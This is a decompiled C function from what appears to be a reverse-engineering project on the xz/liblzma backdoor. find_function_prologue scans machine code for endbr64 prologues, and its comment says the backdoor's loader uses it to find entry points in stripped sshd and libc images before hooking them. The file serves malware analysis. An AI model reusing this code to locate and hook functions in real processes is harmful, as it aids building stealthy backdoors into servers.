// /home/kali/xzre-ghidra/xzregh/100B10_find_function_prologue.c
// Function: find_function_prologue @ 0x100B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_function_prologue(u8 * code_start, u8 * code_end, u8 * * output, FuncFindType find_mode)


/*
 * AutoDoc: Sweeps backward from a code pointer looking for a plausible function prologue based on decoded instruction patterns. The runtime
 * loader uses it to recover entry points in stripped sshd/libc images before installing hooks.
 */

#include "xzre_types.h"

BOOL find_function_prologue(u8 *code_start,u8 *code_end,u8 **output,FuncFindType find_mode)

{
  BOOL BVar1;
  BOOL BVar2;
  long lVar3;
  dasm_ctx_t *pdVar4;
  dasm_ctx_t local_70;
  
  if (find_mode == FIND_ENDBR64) {
    pdVar4 = &local_70;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *(undefined4 *)&pdVar4->instruction = 0;
      pdVar4 = (dasm_ctx_t *)((long)&pdVar4->instruction + 4);
    }
    BVar2 = x86_dasm(&local_70,code_start,code_end);
    BVar1 = FALSE;
    if (((BVar2 != FALSE) && (*(u32 *)&local_70.opcode_window[3] == 3999)) &&
       (((ulong)(local_70.instruction + local_70.instruction_size) & 0xf) == 0)) {
      if (output != (u8 **)0x0) {
        *output = local_70.instruction + local_70.instruction_size;
      }
      BVar1 = TRUE;
    }
  }
  else {
    BVar1 = is_endbr64_instruction(code_start,code_end,0xe230);
    if (BVar1 != FALSE) {
      if (output != (u8 **)0x0) {
        *output = code_start;
      }
      BVar1 = TRUE;
    }
  }
  return BVar1;
}

